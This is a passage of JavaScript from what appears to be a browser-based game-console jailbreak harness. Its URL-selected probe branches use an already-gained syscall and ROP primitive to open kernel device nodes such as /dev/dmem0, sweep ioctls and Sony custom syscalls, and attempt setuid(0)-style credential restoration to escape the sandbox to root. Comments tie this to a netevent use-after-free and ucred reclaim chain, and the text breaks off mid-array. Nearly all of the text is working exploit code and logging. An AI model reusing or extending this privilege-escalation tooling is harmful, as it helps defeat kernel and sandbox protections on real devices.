                GB("A " + dev + " fd=" + fd + " init0x23 rv=" + rv + " err="
                    + (rv === -1 ? errno() : 0) + " out0=" + hx(dv.getUint32(0, true)));
                if (fd > 0) sc(SYS.close, fd, 0, 0, 0, 0, 0);
            }
            // B) full odd-NR ioctl series on /dev/gbase (exact libkernel pattern)
            const paG = readCstrAddr("/dev/gbase");
            const seq = [0xc0044507, 0xc0044509, 0xc004450a, 0xc004450b,
                0xc004450c, 0xc004450d, 0xc004450e, 0xc0044511];
            const vals = [0x320, 0x2a2, 0x2c8, 0x320, 0x390, 0x3d9, 0x834, 0x2d0];
            for (let i = 0; i < seq.length; ++i) {
                const ab = new ArrayBuffer(0x40); keepAlive.push(ab);
                const dv = new DataView(ab);
                for (let o = 0; o < 0x40; o += 4) dv.setUint32(o, 0, true);
                const fd = sc(SYS.open, paG, O_RDWR, 0).i32;
                const cmd = seq[i];
                dv.setUint32(0, vals[i], true);
                const rv = sc(SYS.ioctl, fd, cmd, bufAddr(ab), 0, 0, 0).i32;
                GB("B gbase ioctl " + hx(cmd) + " val=0x" + vals[i].toString(16)
                    + " rv=" + rv + " err=" + (rv === -1 ? errno() : 0)
                    + " out0=" + hx(dv.getUint32(0, true)));
                if (fd > 0) sc(SYS.close, fd, 0, 0, 0, 0, 0);
            }
            // C) 0x40084516 read-back on gbase
            for (let i = 0; i < 2; ++i) {
                const ab = new ArrayBuffer(0x40); keepAlive.push(ab);
                const dv = new DataView(ab);
                for (let o = 0; o < 0x40; o += 4) dv.setUint32(o, 0, true);
                const fd = sc(SYS.open, paG, O_RDONLY, 0).i32;
                const rv = sc(SYS.ioctl, fd, 0x40084516, bufAddr(ab), 0, 0, 0).i32;
                GB("C gbase readb rv=" + rv + " err=" + (rv === -1 ? errno() : 0)
                    + " out0=" + hx(dv.getUint32(0, true)));
                if (fd > 0) sc(SYS.close, fd, 0, 0, 0, 0, 0);
            }
            GB("done");
            mark("PROOF-SUMMARY-FINAL", "pass=" + passCount + " fail=" + failCount);
            return;
        }

        // ?probe=vbo -- DMEM0 0x2000800b IOCTL (THE REAL OPENER SEQUENCE, 2026-09-12).
        // The libkernel inner opener @0x18210 does open("/dev/dmem0",O_RDWR) then
        // ioctl(fd,0x2000800b,NULL) then close. 0x2000800b is the ONLY ioctl
        // number in the whole opener -- every prior probe used 0x80108002
        // (release_direct_memory rearm); 0x2000800b was NEVER tried. Hypothesis:
        // the browser's fresh dmem0 fd (fd=9) fails mmap because it was never
        // put through THIS sequence (open-notifier -> ioctl 0x2000800b arms the
        // mmap state). Test the exact opener sequence first, then rearm + mmap.
        if (params.get("probe") === "vbo") {
            const VB = d => mark("VBO", d);
            VB("start pid=" + sc(SYS.getpid).i32 + " uid=" + sc(SYS.getuid).i32);
            const O_RDWR = 2, PROT_RW = 3, MAP_SHARED = 0x1;
            const IOC_REARM = 0x80108002, IOC_VBO = 0x2000800b;
            const pathAb = new ArrayBuffer(32); keepAlive.push(pathAb);
            const u8 = new Uint8Array(pathAb);
            const p = "/dev/dmem0";
            for (let i = 0; i < p.length; ++i) u8[i] = p.charCodeAt(i);
            u8[p.length] = 0;
            const pa = bufAddr(pathAb);
            const reAb = new ArrayBuffer(0x20); keepAlive.push(reAb);
            const reDv = new DataView(reAb);
            reDv.setUint32(0, 0x100000, true); reDv.setUint32(8, 0x100000, true);
            const bufAb = new ArrayBuffer(0x40); keepAlive.push(bufAb);
            const bufDv = new DataView(bufAb);
            for (let o = 0; o < 0x40; o += 4) bufDv.setUint32(o, 0, true);
            // 1) EXACT opener sequence: open -> ioctl(vbo, NULL) -> (don't close)
            let fd = sc(SYS.open, pa, O_RDWR, 0).i32;
            VB("1 open fd=" + fd + " err=" + (fd <= 0 ? errno() : 0));
            let rv = sc(SYS.ioctl, fd, IOC_VBO, 0, 0, 0, 0).i32;
            VB("1 ioctl vbo NULL rv=" + rv + " err=" + (rv === -1 ? errno() : 0));
            // keep this fd open -- call it the VBO fd
            const vfd = fd;
            // 2) mmap on the VBO fd (the opener itself never mmaps, but the
            //    browser fd needs map state; try after the identical sequence)
            let mm = sc(SYS.mmap, 0, 0x1000000, PROT_RW, MAP_SHARED, vfd, 0).i32;
            VB("2 mmap vfd rv=" + hx(mm) + " err=" + errno());
            if (mm > 0) sc(SYS.munmap, mm, 0x1000000, 0, 0, 0, 0);
            // 3) also try with address hint like the game (mmap(0) already)
            // 4) rearm then mmap on vfd (merged sequence)
            rv = sc(SYS.ioctl, vfd, IOC_REARM, bufAddr(reAb), 0, 0, 0).i32;
            VB("4 rearm vfd rv=" + rv + " err=" + (rv === -1 ? errno() : 0));
            mm = sc(SYS.mmap, 0, 0x1000000, PROT_RW, MAP_SHARED, vfd, 0).i32;
            VB("4 mmap after rearm rv=" + hx(mm) + " err=" + errno());
            if (mm > 0) sc(SYS.munmap, mm, 0x1000000, 0, 0, 0, 0);
            // 5) retry VBO ioctl with a struct arg (maybe takes a buffer)
            rv = sc(SYS.ioctl, vfd, IOC_VBO, bufAddr(bufAb), 0, 0, 0).i32;
            VB("5 ioctl vbo buf rv=" + rv + " err=" + (rv === -1 ? errno() : 0)
                + " out0=" + hx(bufDv.getUint32(0, true)));
            // 6) query direct memory type on vfd
            rv = sc(SYS.ioctl, vfd, 0x80288012, bufAddr(reAb), 0, 0, 0).i32;
            VB("6 query vfd rv=" + rv + " err=" + (rv === -1 ? errno() : 0));
            // 7) fresh EPERM baseline on a fresh open (compare vs vfd)
            const fd2 = sc(SYS.open, pa, O_RDWR, 0).i32;
            VB("7 fresh open fd=" + fd2 + " err=" + (fd2 <= 0 ? errno() : 0));
            mm = sc(SYS.mmap, 0, 0x1000000, PROT_RW, MAP_SHARED, fd2, 0).i32;
            VB("7 fresh mmap rv=" + hx(mm) + " err=" + errno());
            VB("done");
            mark("PROOF-SUMMARY-FINAL", "pass=" + passCount + " fail=" + failCount);
            return;
        }

        // ?probe=sb588 -- SONY CUSTOM sc#588 DMEM BIND AFTER mmap (2026-09-12).
        // RE of libkernel 0x18350/0x18400 shows the REAL dmem window path is:
        //   mmap(hint, len, PROT, MAP_ANON..., -1, 0)   via 0x125a0 (=sc#477)
        //   sc#588(map_addr, len, type)                 via 0x1c90
        // sc#588 is NEVER tried: every prior Sony custom sweep (585,596,599...)
        // called with (0,0,0) so the kernel returned 0 without binding. This
        // probe: mmap a large RW region (which WORKS from the browser, sc#477
        // RW OK per AGENTS) then sc#588 with the exact (addr,len,type) args
        // that 0x18350/0x18400 pass. If rv != 0 the browser just got a
        // kernel-registered dmem window mapping (possibly kernel dmap like the
        // game's internal 16MB window). Try several hints/types in one page.
        if (params.get("probe") === "sb588") {
            const S8 = d => mark("SB588", d);
            S8("start pid=" + sc(SYS.getpid).i32 + " uid=" + sc(SYS.getuid).i32);
            const PROT_RW = 3;
            const MAP_BITS = 0x203090; // MAP_ANON|MAP_NOCORE|... as libkernel uses
            const HINTS = [0, 0x100000, 0x200000000, 0x880000000];
            const TYPES = [0, 1, 2, 3, 0x23, 0xffffffff];
            // A) bare mmap with libkernel's exact flags (address hints)
            const ALEN = 0x1000000;
            for (let i = 0; i < HINTS.length; ++i) {
                const hint = HINTS[i] === undefined ? 0 : HINTS[i];
                const a = sc(SYS.mmap, hint, ALEN, PROT_RW, MAP_BITS, 0xffffffff, 0).i32;
                const ae = a === -1 ? errno() : 0;
                S8("A mmap hint=" + hx(hint) + " len=0x1000000 rv=" + hx(a) + " err=" + ae);
                if (a > 0 && a !== 0xffffffff) sc(SYS.munmap, a, ALEN, 0, 0, 0, 0);
            }
            // B) single combined flow: mmap then sc#588 with each type
            const Buf = new ArrayBuffer(0x1000); keepAlive.push(Buf);
            const bufDvB = new DataView(Buf);
            const base = sc(SYS.mmap, 0, 0x1000000, PROT_RW, MAP_BITS, 0xffffffff, 0).i32;
            S8("B mmap base=" + hx(base) + " err=" + (base === -1 ? errno() : 0));
            for (let t = 0; base > 0 && t < TYPES.length; ++t) {
                bufDvB.setUint32(0, 0, true);
                const r = sc(588, base, 0x1000, TYPES[t], 0, 0, 0).i32;
                S8("B sc588 type=0x" + TYPES[t].toString(16) + " len=0x1000 rv=" + r
                    + " err=" + (r === -1 ? errno() : 0) + " out0="
                    + hx(bufDvB.getUint32(0, true)));
            }
            // C) probe sc#588 with out-buffer ptr in arg4 (rdi=base, rsi=len,
            //    rdx=in-type, rcx=outptr) mirroring 0x18500's [rcx] store
            for (let t = 0; base > 0 && t < TYPES.length; ++t) {
                const r = sc(588, base, 0x1000000, t, bufAddr(Buf), 0, 0).i32;
                S8("C sc588(...,outbuf) type=" + t + " rv=" + r +
                    " err=" + (r === -1 ? errno() : 0) +
                    " out0=" + hx(bufDvB.getUint32(0, true)));
            }
            if (base > 0) sc(SYS.munmap, base, 0x1000000, 0, 0, 0, 0);
            // D) MAP_SHARED on the real dmem fd (via the vbo-armed opener path
            //    that just worked rv=0) then sc#588 bind on the returned map.
            const paD = (() => {
                const ab = new ArrayBuffer(32); keepAlive.push(ab);
                const u = new Uint8Array(ab);
                const s = "/dev/dmem0";
                for (let i = 0; i < s.length; ++i) u[i] = s.charCodeAt(i);
                u[s.length] = 0;
                return bufAddr(ab);
            })();
            const fdD = sc(SYS.open, paD, 2, 0).i32;
            S8("D open fd=" + fdD + " err=" + (fdD <= 0 ? errno() : 0));
            const vD = sc(SYS.ioctl, fdD, 0x2000800b, 0, 0, 0, 0).i32;
            S8("D ioctl vbo rv=" + vD + " err=" + (vD === -1 ? errno() : 0));
            for (const [mk, fl] of [[1, 0x1], [1, 0x2], [0, 0x1], [0, 0x2]]) {
                const mmD = sc(SYS.mmap, 0, 0x100000, mk === 1 ? 3 : 1, fl, fdD, 0).i32;
                const mmU = mmD >>> 0;
                S8("D mmap prot=" + (mk === 1 ? "RW" : "R") + " flags=0x" + fl.toString(16)
                    + " rv=" + hx(mmU) + " err=" + (mmU === 0xffffffff ? errno() : 0));
                if (mmU !== 0xffffffff && mmU >= 0x1000) {
                    for (let t = 0; t < TYPES.length; ++t) {
                        const r = sc(588, mmU, 0x1000, TYPES[t], 0, 0, 0).i32;
                        S8("D sc588 type=0x" + TYPES[t].toString(16) + " rv=" + r
                            + " err=" + (r === -1 ? errno() : 0));
                    }
                    sc(SYS.munmap, mmU, 0x100000, 0, 0, 0, 0);
                }
            }
            if (fdD > 0) sc(SYS.close, fdD, 0, 0, 0, 0, 0);
            // E) mmap anon RW buffer then hand its VA to ioctl 0x2000800b as arg3.
            //    p.read4 and socketpair-copy both hang on arbitrary VAs, so the
            //    only observable is the ioctl return. Always open a FRESH fd
            //    (fdD is closed at the end of D -> EBADF otherwise).
            const mmE = sc(SYS.mmap, 0, 0x100000, 3, 0x1002, 0xffffffff, 0).i32;
            const mmEU = mmE >>> 0;
            S8("E anon mmap rv=" + hx(mmEU) + " err=" + (mmEU === 0xffffffff ? errno() : 0));
            if (mmEU !== 0xffffffff && mmEU >= 0x1000) {
                const fe = sc(SYS.open, paD, 2, 0).i32;
                const rE = sc(SYS.ioctl, fe, 0x2000800b, mmEU, 0, 0, 0).i32;
                S8("E ioctl vbo arg=anon rv=" + rE + " err=" + (rE === -1 ? errno() : 0));
                sc(SYS.close, fe, 0, 0, 0, 0, 0);
                sc(SYS.munmap, mmEU, 0x100000, 0, 0, 0, 0);
            }
            // G) CRITICAL sequence: on one FRESH fd, ioctl vbo(0) then
            //    ioctl vbo(anonVA) -- vbo-with-arg returned rv=0 above -- then
            //    try mmap on THAT SAME fd. Does the arg=anon ioctl flip the
            //    fd into a state where mmap succeeds (EPERM normally)?
            {
                const mmG = sc(SYS.mmap, 0, 0x100000, 3, 0x1002, 0xffffffff, 0).i32;
                const mmGU = mmG >>> 0;
                S8("G anon rv=" + hx(mmGU));
                const fdG = sc(SYS.open, paD, 2, 0).i32;
                S8("G open fd=" + fdG + " err=" + (fdG <= 0 ? errno() : 0));
                const v1 = sc(SYS.ioctl, fdG, 0x2000800b, 0, 0, 0, 0).i32;
                const v2 = sc(SYS.ioctl, fdG, 0x2000800b, mmGU, 0, 0, 0).i32;
                S8("G vbo(0)=" + v1 + " vbo(anon)=  " + v2
                    + " err=" + (v2 === -1 ? errno() : 0));
                for (const [mk, fl] of [[3, 0x1], [3, 0x2], [1, 0x1]]) {
                    const rG = sc(SYS.mmap, mmGU, 0x100000, mk, fl, fdG, 0).i32;
                    S8("G mmap(anonHint,prot=" + mk + ",flags=0x" + fl.toString(16)
                        + ") rv=" + hx(rG >>> 0)
                        + " err=" + ((rG >>> 0) === 0xffffffff ? errno() : 0));
                }
                sc(SYS.close, fdG, 0, 0, 0, 0, 0);
                if (mmGU !== 0xffffffff) sc(SYS.munmap, mmGU, 0x100000, 0, 0, 0, 0);
            }
            // F) ioctl 0x2000800b with a LARGE user buffer pointer as arg3
            // (the vbo path accepted NULL rv=0; maybe the 4th arg picks WHERE
            // the dmem window maps -- pass a user anon VA instead of NULL)
            {
                const big = new ArrayBuffer(0x1000000); keepAlive.push(big);
                const bigAddr = bufAddr(big) >>> 0;
                S8("F bigBuf=" + hx(bigAddr));
                const fdF = sc(SYS.open, paD, 2, 0).i32;
                const rF = sc(SYS.ioctl, fdF, 0x2000800b, bigAddr, 0, 0, 0).i32;
                S8("F ioctl vbo bigbuf rv=" + rF + " err=" + (rF === -1 ? errno() : 0));
                sc(SYS.close, fdF, 0, 0, 0, 0, 0);
            }
            S8("done");
            mark("PROOF-SUMMARY-FINAL", "pass=" + passCount + " fail=" + failCount);
            return;
        }

        // ?probe=devopen -- OPEN EVERY /dev DEVICE FOUND IN libkernel.bin
        // (2026-09-12). The browser proven SYS.open("/dev/dmem0") bypasses the
        // game-sandbox fd wrapper (fd=9, err=0). Sweep all 19 device paths: for
        // each, open O_RDWR (fallback O_RDONLY), log fd/errno; for any success
        // try ioctl rearm + a read, all via sc() (no callAddr -> no hang risk).
        if (params.get("probe") === "devopen") {
            const DV = d => mark("DEVOPEN", d);
            DV("start pid=" + sc(SYS.getpid).i32 + " uid=" + sc(SYS.getuid).i32);
            const O_RDWR = 2, O_RDONLY = 0, PROT_RW = 3, MAP_SHARED = 0x1;
            const IOC_REARM = 0x80108002, IOC_QUERY = 0x80288012;
            const DEV = ["/dev/dmem0","/dev/dmem","/dev/dipsw","/dev/gbase",
                "/dev/dce","/dev/icc_configuration","/dev/icc_indicator",
                "/dev/icc_nvs","/dev/icc_power","/dev/icc_device_power",
                "/dev/iccnvs1","/dev/icc_fan","/dev/evlg1","/dev/evlg0",
                "/dev/sdk_eventlog","/dev/srtc","/dev/sbi","/dev/console",
                "/dev/notification"];
            const writeCstr = (ab, s) => {
                const u8 = new Uint8Array(ab);
                for (let i = 0; i < s.length; ++i) u8[i] = s.charCodeAt(i);
                u8[s.length] = 0;
                return bufAddr(ab);
            };
            const pathAb = new ArrayBuffer(32); keepAlive.push(pathAb);
            const bufAb = new ArrayBuffer(0x40); keepAlive.push(bufAb);
            const reAb = new ArrayBuffer(0x20); keepAlive.push(reAb);
            const bufAddr_ = bufAddr(bufAb), reDv = new DataView(reAb);
            reDv.setUint32(0, 0x100000, true); reDv.setUint32(8, 0x100000, true);
            const openResults = [];
            for (let i = 0; i < DEV.length; ++i) {
                const path = DEV[i];
                const pa = writeCstr(pathAb, path);
                let fd = sc(SYS.open, pa, O_RDWR, 0).i32;
                let mode = "RDWR";
                if (fd <= 0) {
                    const fd2 = sc(SYS.open, pa, O_RDONLY, 0).i32;
                    if (fd2 > 0) { fd = fd2; mode = "RDONLY"; }
                    else { mode = "FAIL-RDWR-" + errno() + "-RDONLY-" + errno(); }
                }
                DV(path + " fd=" + fd + " mode=" + mode);
                if (fd > 0) {
                    openResults.push(path + "@" + fd);
                    const rR = sc(SYS.ioctl, fd, IOC_REARM, bufAddr_, 0, 0, 0).i32;
                    DV("  ioctl rearm fd=" + fd + " rv=" + rR + " err=" + errno());
                    const rQ = sc(SYS.ioctl, fd, IOC_QUERY, bufAddr_, 0, 0, 0).i32;
                    DV("  ioctl query fd=" + fd + " rv=" + rQ + " err=" + errno());
                    if (rR === 0) {
                        const mm = sc(SYS.mmap, 0, 0x1000000, PROT_RW, MAP_SHARED, fd, 0).i32;
                        DV("  mmap fd=" + fd + " rv=" + hx(mm) + " err=" + errno());
                    }
                    sc(SYS.close, fd, 0, 0, 0, 0, 0);
                }
            }
            DV("results=" + (openResults.length ? openResults.join(",") : "none"));
            mark("PROOF-SUMMARY-FINAL", "pass=" + passCount + " fail=" + failCount);
            return;
        }

        // ?probe=sonyb -- SONY CUSTOM RE-SWEEP WITH VALID BUFFER ARGS (2026-09-12).
        // Zero-arg sweep proved HANG-happy: every Sony custom that takes any
        // real argument (435/585/586...) spins forever on (0,0,0,0,0,0) --
        // only the no-arg 434 survives. The hang is the kernel waiting on a
        // null user pointer (they call copyin/copyout before returning).
        // Hypothesis: calling with a VALID mapped scratch buffer (arg1=ptr,
        // arg2=size) lets the kernel copyout and RETURN (like the game got
        // -1/EINVAL for most). Sweep (ptr=S, 0x100, 0,0,0,0).
        if (params.get("probe") === "sonyb") {
            // reuse scratch buffers: xorAddr is the standard scratch ptr
            mark("SONYB", "sweep start pid=" + sc(SYS.getpid).i32
                + " uid=" + sc(SYS.getuid).i32);
            const sb_ = new ArrayBuffer(0x200);
            keepAlive.push(sb_);
            const scratchPtr = bufAddr(sb_);
            // single-number mode: ?n=<num> calls ONLY that number (others hang
            // the renderer for reasons unrelated to args; the single probe is
            // the only way to attribute exactly one number per run)
            const singleN = params.has("n") ? parseInt(params.get("n"), 10) : NaN;
            let so;
            if (!isNaN(singleN)) {
                mark("SONYB", "single-number mode n=" + singleN);
                const singleOffTab = {
                    434:0x15d0,435:0x15f0,585:0x1c30,586:0x1c50,587:0x1c70,
                    588:0x1c90,591:0x1cb0,592:0x1cd0,593:0x1cf0,594:0x1d10,
                    595:0x1d30,596:0x1d50,598:0x1d70,599:0x1d90,600:0x1db0,
                    601:0x1dd0,602:0x1df0,603:0x1e10,604:0x1e30,605:0x1e50,
                    606:0x1e70,607:0x1e90,608:0x1eb0,610:0x1ed0,611:0x1ef0,
                    612:0x1f10,613:0x1f30,615:0x1f50,616:0x1f70,617:0x1f90,
                    618:0x1fb0,619:0x1fd0,620:0x1ff0,622:0x2010,623:0x2030,
                    624:0x2050,625:0x2070,626:0x2090,627:0x20b0,628:0x20d0,
                    629:0x20f0,630:0x2110,632:0x2130,633:0x2150,634:0x2170,
                    635:0x2190,636:0x21b0,637:0x21d0,638:0x21f0,639:0x2210,
                    640:0x2230,641:0x2250,642:0x2270,643:0x2290,646:0x22b0,
                    647:0x22d0,648:0x22f0,649:0x2310,652:0x2330,653:0x2350,
                    654:0x2370,655:0x2390,656:0x23b0,657:0x23d0,658:0x23f0,
                    659:0x2410,660:0x2430,661:0x2450,662:0x2470,663:0x2490,
                    664:0x24b0,665:0x24d0,666:0x24f0,667:0x2510,668:0x2530,
                    669:0x2550,670:0x2570,671:0x2590,672:0x25b0,673:0x25d0,
                    674:0x25f0,675:0x2610,676:0x2630,677:0x2650};
                so = (singleOffTab[singleN] !== undefined)
                    ? [[singleN, singleOffTab[singleN]]] : [];
                if (so.length === 0) {
                    mark("SONYB", "n=" + singleN + " has no stub (not real on 13.52)");
                    mark("PROOF-SUMMARY-FINAL", "pass=" + passCount + " fail=" + failCount);
                    return;
                }
            } else {
            const sodefault = [
                [586,0x1c50],[587,0x1c70],[588,0x1c90],[591,0x1cb0],[592,0x1cd0],
                [593,0x1cf0],[594,0x1d10],[595,0x1d30],[596,0x1d50],[598,0x1d70],
                [599,0x1d90],[600,0x1db0],[601,0x1dd0],[602,0x1df0],[603,0x1e10],
                [604,0x1e30],[605,0x1e50],[606,0x1e70],[607,0x1e90],[608,0x1eb0],
                [610,0x1ed0],[611,0x1ef0],[612,0x1f10],[613,0x1f30],[615,0x1f50],
                [616,0x1f70],[617,0x1f90],[618,0x1fb0],[619,0x1fd0],[620,0x1ff0],
                [623,0x2030],[624,0x2050],[625,0x2070],[626,0x2090],[627,0x20b0],
                [628,0x20d0],[629,0x20f0],[630,0x2110],[632,0x2130],[633,0x2150],
                [634,0x2170],[635,0x2190],[636,0x21b0],[637,0x21d0],[638,0x21f0],
                [639,0x2210],[640,0x2230],[641,0x2250],[642,0x2270],[643,0x2290],
                [646,0x22b0],[647,0x22d0],[648,0x22f0],[649,0x2310],[652,0x2330],
                [653,0x2350],[654,0x2370],[655,0x2390],[656,0x23b0],[657,0x23d0],
                [658,0x23f0],[659,0x2410],[660,0x2430],[661,0x2450],[662,0x2470],
                [663,0x2490],[664,0x24b0],[665,0x24d0],[666,0x24f0],[667,0x2510],
                [668,0x2530],[669,0x2550],[670,0x2570],[671,0x2590],[672,0x25b0],
                [673,0x25d0],[674,0x25f0],[675,0x2610],[676,0x2630],[677,0x2650]];
                so = sodefault;
            }
            let survivors = [];
            for (let i = 0; i < so.length; ++i) {
                const [num, off] = so[i];
                if ((i % 20) === 19) mark("SONYB-PROGRESS", (i + 1) + "/" + so.length);
                const a = libkernelBase.add32(off);
                const rv = callAddr(a, [scratchPtr, 0x100, 0, 0, 0, 0]);
                const isErr = rv.i32 === -1;
                mark("SONYB", "sc#" + num + " rv=" + rv.i32
                    + (isErr ? " err=" + errno() : ""));
                if (!isErr) survivors.push(num);
            }
            mark("SONYB-SURVIVORS", survivors.length === 0 ? "none" : survivors.join(","));
            mark("PROOF-SUMMARY-FINAL", "pass=" + passCount + " fail=" + failCount);
            return;
        }

        // ?probe=sony -- SONY CUSTOM SYSCALL RANGE SWEEP (2026-09-12).
        // The scanner established ALL 275 stubs sit in libkernel exec range
        // (dump 0x0-0x2800). The game-side probes only tried a few (585-670,
        // -1 or CRASH). The BROWSER has a wider netcontrol/IPV6_RTHDR surface
        // and its own stub table, so every Sony custom (434/435 + 585-677) is
        // callable here via callAddr ROP. We sweep each with (0,0,0,0,0,0)
        // first (pure existence/isolation probe), logging per-call rv/errno.
        // The per-call log line tells us exactly which number survives; any
        // crash = process restart + skip that number next time (page reloads).
        // Known from game: 622/656-662/663-670 CRASH as native.fcall; here we
        // still try them (browser path differs) BUT LATE in the sweep so the
        // survivors are logged first. Numbers absent from the stub table are
        // not real syscalls on 13.52 (stub validation: each stub = one syscall).
        if (params.get("probe") === "sony") {
            mark("SONY", "sweep start pid=" + sc(SYS.getpid).i32
                + " uid=" + sc(SYS.getuid).i32);
            const so = [
                [586,0x1c50],[587,0x1c70],[588,0x1c90],[591,0x1cb0],[592,0x1cd0],
                [593,0x1cf0],[594,0x1d10],[595,0x1d30],[596,0x1d50],[598,0x1d70],
                [599,0x1d90],[600,0x1db0],[601,0x1dd0],[602,0x1df0],[603,0x1e10],
                [604,0x1e30],[605,0x1e50],[606,0x1e70],[607,0x1e90],[608,0x1eb0],
                [610,0x1ed0],[611,0x1ef0],[612,0x1f10],[613,0x1f30],[615,0x1f50],
                [616,0x1f70],[617,0x1f90],[618,0x1fb0],[619,0x1fd0],[620,0x1ff0],
                [623,0x2030],[624,0x2050],[625,0x2070],[626,0x2090],[627,0x20b0],
                [628,0x20d0],[629,0x20f0],[630,0x2110],[632,0x2130],[633,0x2150],
                [634,0x2170],[635,0x2190],[636,0x21b0],[637,0x21d0],[638,0x21f0],
                [639,0x2210],[640,0x2230],[641,0x2250],[642,0x2270],[643,0x2290],
                [646,0x22b0],[647,0x22d0],[648,0x22f0],[649,0x2310],[652,0x2330],
                [653,0x2350],[654,0x2370],[655,0x2390],[656,0x23b0],[657,0x23d0],
                [658,0x23f0],[659,0x2410],[660,0x2430],[661,0x2450],[662,0x2470],
                [663,0x2490],[664,0x24b0],[665,0x24d0],[666,0x24f0],[667,0x2510],
                [668,0x2530],[669,0x2550],[670,0x2570],[671,0x2590],[672,0x25b0],
                [673,0x25d0],[674,0x25f0],[675,0x2610],[676,0x2630],[677,0x2650],
                [585,0x1c30]];
            // Suspected-renderer-HANG numbers moved LAST so earlier entries log
            // first: 435@0x15f0/622@0x2010 excluded from run entirely
            // (17:34-17:39: every run stopped right after 434, never printed
            // 435 or 585). 585 moved to the tail: if it is the hang, we still
            // collect 434+586-677 first. 434 kept FIRST (it returns a stable
            // pointer-like value, 18395584/18387584 across pids 66/67, worth
            // re-examining alone).
            let survivors = [];
            for (let i = 0; i < so.length; ++i) {
                const [num, off] = so[i];
                if ((i % 20) === 19) mark("SONY-PROGRESS", (i + 1) + "/" + so.length);
                const a = libkernelBase.add32(off);
                const rv = callAddr(a, [0, 0, 0, 0, 0, 0]);
                const isErr = rv.i32 === -1;
                mark("SONY", "sc#" + num + " rv=" + rv.i32
                    + (isErr ? " err=" + errno() : ""));
                if (!isErr) survivors.push(num);
            }
            mark("SONY-SURVIVORS", survivors.length === 0 ? "none" : survivors.join(","));
            mark("PROOF-SUMMARY-FINAL", "pass=" + passCount + " fail=" + failCount);
            return;
        }

        // ?probe=credswap -- THE DECISIVE UCRED-SWAP PROBE. Two live facts
        // (2026-09-12): (1) the browser WebProcess runs uid=1, so the poops arm
        // `setuid(1)x2` is a no-op there -- Sony's kernel detects same-uid
        // setuid and SKIPS the crget/crset ucred swap, so no ucred is freed and
        // the iov spray finds nothing (SPRAY-STATS was all EFAULT: the expected
        // outcome only if a freed ucred was waiting; with none freed, nothing is
        // reclaimable -> no twins). (2) THE ESCAPE: if the sandbox drop from the
        // root launcher used setuid/seteuid/setresuid, SONY'S FreeBSD keeps the
        // saved uid (svuid) -- and on stock FreeBSD setuid(x) is permitted when
        // x==svuid even while euid=ruid=1. So `setuid(0)` / `setregid(0,0)` may
        // RESTORE uid 0 entirely, making the whole poops chain work unchanged.
        // This probe runs every credential-restore and every same-value swap
        // candidate and reports rv + resulting uid/euid/gid/egid for each.
        if (params.get("probe") === "credswap" || params.get("probe") === "cs") {
            const CS = d => mark("CRED", d);
            // FRESHNESS + UPTIME. We need two fresh sockets: firstfd to detect
            // fd-table staleness, plus a CLOCK_UPTIME (clockid=5, sc#232)
            // check to verify whether a power cycle actually happened.
            {
                const ffd = sc(SYS.socket, AF_UNIX, SOCK_STREAM, 0).i32;
                new Uint32Array(scratchAb).fill(0);
                const clk = sc(SYS.clock_gettime, 5, scratch).i32;
                const uptSec = (clk === 0)
                    ? new DataView(scratchAb).getUint32(0, true) | 0
                    : -1;
                CS("FRESHNESS pid=" + sc(SYS.getpid).i32
                    + " uid=" + sc(SYS.getuid).i32
                    + " firstfd=" + ffd
                    + " uptsec=" + uptSec
                    + (ffd > 60 ? " RECYCLE-NO" : " RECYCLE-YES")
                    + (uptSec >= 0 ? " up" + (uptSec / 60 | 0) + "m" : ""));
                if (ffd > 0) sc(SYS.close, ffd);
            }
            const g = n => {
                const v = sc(SYS.getuid).i32;
                const e = sc(SYS.geteuid).i32;
                const gg = sc(SYS.getgid).i32;
                const ge = sc(SYS.getegid).i32;
                return { v, e, gg, ge };
            };
            const show = (tag, c) => CS(tag + " rv=" + c.rv
                + " err=" + (c.rv === -1 ? errno() : 0)
                + " uid=" + c.g.v + " euid=" + c.g.e
                + " gid=" + c.g.gg + " egid=" + c.g.ge);

            const base = g();
            CS("BASELINE uid=" + base.v + " euid=" + base.e
                + " gid=" + base.gg + " egid=" + base.ge);

            // Phase 1: UPWARD RESTORE (the big prize). If any of these returns
            // rv=0 AND the uid/gid readback changes, we have full privilege and
            // the real chain (unmodified) will function -- the state persists for
            // the rest of this page + any re-entrant main-jailbreak run.
            const up = {};
            up.setuid0 = { rv: sc(SYS.setuid, 0).i32, g: g() };
            show("setuid(0)", up.setuid0);
            up.setregid00 = { rv: sc(SYS.setregid, 0, 0).i32, g: g() };
            show("setregid(0,0)", up.setregid00);
            up.setegid0 = { rv: sc(SYS.setegid, 0).i32, g: g() };
            show("setegid(0)", up.setegid0);
            // setgroups(0,NULL) -> drop ALL supplementary groups. Requires
            // PRIV_CRED_SETGROUPS; at uid 0 it succeeds and is harmless.
            up.setgroups0 = { rv: sc(SYS.setgroups, 0, 0).i32, g: g() };
            show("setgroups(0,NULL)", up.setgroups0);
            up.setuid0again = { rv: sc(SYS.setuid, 0).i32, g: g() };
            show("setuid(0)#2", up.setuid0again);

            const restored = g();
            const isRoot = restored.v === 0 || restored.e === 0;
            CS("RESTORED uid=" + restored.v + " euid=" + restored.e
                + " ROOT=" + (isRoot ? "YES" : "NO"));
            if (isRoot) {
                try { localStorage.setItem("ps4lab_cred_root", "1"); } catch (e) { }
                CS("ESCAPED to root -- re-running the real jailbreak path");
            }

// Phase 2: PATCH-GAP. Even without root, if Sony hardened ONLY the
            // setuid syscall (the rawgame-exploited path) but NOT its siblings
            // of equal stock-FreeBSD crget/crset behavior, then a same-gid
            // setegid/setregid/setgroups swap STILL allocates a fresh ucred at
            // uid=1, arming the netevent UAF. Restore baseline first: we may
            // have become gid 0 in phase 1; put gid back to 1 where possible.
            if (sc(SYS.getgid).i32 !== 1) {
                const rvBack = sc(SYS.setregid, 1, 1).i32;
                CS("gid-restore setregid(1,1) rv=" + rvBack
                    + " gid now=" + sc(SYS.getgid).i32);
            }

            // STUCK-SLOT DIAGNOSIS (removed the fd-brute-force sweep: ~1620 ROP calls
            // over the documented timeout budget, and it PROVED non-productive
            // 2026-09-12 -- freedSlots=0 across all of fds 3..812 because once a
            // netevent-registered socket's fd is reused, netcontrol CLEAR can no
            // longer match it (registrations are held by file pointer, keyed by
            // the slot, not the fd). The only reliable recovery is a genuine
            // fresh WebProcess after a real power cycle; the FRESHNESS/uptsec
            // line above now proves whether that happened (uptsec resets to ~0
            // on boot). Slot EIO(5) = stuck-slot (Poops.java:713 "cursed PS5"
            // fallback is the same permanent-occupancy state).
            CS("STUCK-RECOVERY note: EIO(5) on SET = slot permanently occupied in this WebProcess; only a real power cycle frees it (uptsec checks whether one happened)".slice(0, 140));
            const candidates = [
